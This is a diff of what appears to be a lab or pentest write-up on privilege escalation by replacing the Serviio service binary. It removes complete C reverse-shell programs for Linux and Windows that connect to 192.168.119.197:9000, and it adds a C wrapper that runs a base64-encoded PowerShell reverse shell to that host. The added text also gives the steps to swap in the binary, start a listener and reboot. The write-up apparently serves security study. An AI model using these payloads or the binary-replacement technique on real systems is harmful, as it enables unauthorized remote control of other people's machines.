@@ -364,79 +364,20 @@ As we do not have permissions to restart the service we can force a restart by s
 
 **2.  Attempt to get a remote system shell rather than adding a malicious user.**
 
-In order to get a remote shell we must simply edit our original exploit and replace the original code to add a new user with code that acts as a reverse shell. The code will be used:
-c
+In order to get a remote shell we must simply edit our original exploit and replace the original system command which adds a new user with a new system command which invokes a reverse shell via powershell. The binary will be generated from the following code:
 ```C
-#include <stdio.h>
-#include <sys/socket.h>
-#include <sys/types.h>
 #include <stdlib.h>
-#include <unistd.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
 
-int main(void){
-    int port = 9000;
-    struct sockaddr_in revsockaddr;
-
-    int sockt = socket(AF_INET, SOCK_STREAM, 0);
-    revsockaddr.sin_family = AF_INET;       
-    revsockaddr.sin_port = htons(port);
-    revsockaddr.sin_addr.s_addr = inet_addr("192.168.119.197");
-
-    connect(sockt, (struct sockaddr *) &revsockaddr, 
-    sizeof(revsockaddr));
-    dup2(sockt, 0);
-    dup2(sockt, 1);
-    dup2(sockt, 2);
-
-    char * const argv[] = {"sh", NULL};
-    execve("sh", argv, NULL);
-
-    return 0;       
-}
-```
-c windows
-```C
-#include <winsock2.h>
-#include <stdio.h>
-#pragma comment(lib,"ws2_32")
-
-WSADATA wsaData;
-SOCKET Winsock;
-struct sockaddr_in hax; 
-char ip_addr[16] = "192.168.119.197"; 
-char port[6] = "9000";            
-
-STARTUPINFO ini_processo;
-
-PROCESS_INFORMATION processo_info;
-
-int main()
+int main ()
 {
-    WSAStartup(MAKEWORD(2, 2), &wsaData);
-    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
+  int i;
 
+  i = system ("powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA5AC4AMQA5ADcAIgAsADkAMAAwADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA");
 
-    struct hostent *host; 
-    host = gethostbyname(ip_addr);
-    strcpy_s(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));
-
-    hax.sin_family = AF_INET;
-    hax.sin_port = htons(atoi(port));
-    hax.sin_addr.s_addr = inet_addr(ip_addr);
-
-    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
-
-    memset(&ini_processo, 0, sizeof(ini_processo));
-    ini_processo.cb = sizeof(ini_processo);
-    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
-    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
-
-    TCHAR cmd[255] = TEXT("cmd.exe");
-
-    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
-
-    return 0;
+  return 0;
 }
 ```
+
+Once compiled into an exe we then follow the same steps as above, transferring the file to our windows machine, replacing the original "ServiioService.exe" binary, and restarting the system to restart the service. Before we reboot the machine we start a listener which, upon next login, will receive a reverse connection.
+
+![[Pasted image 20220726111659.png]]
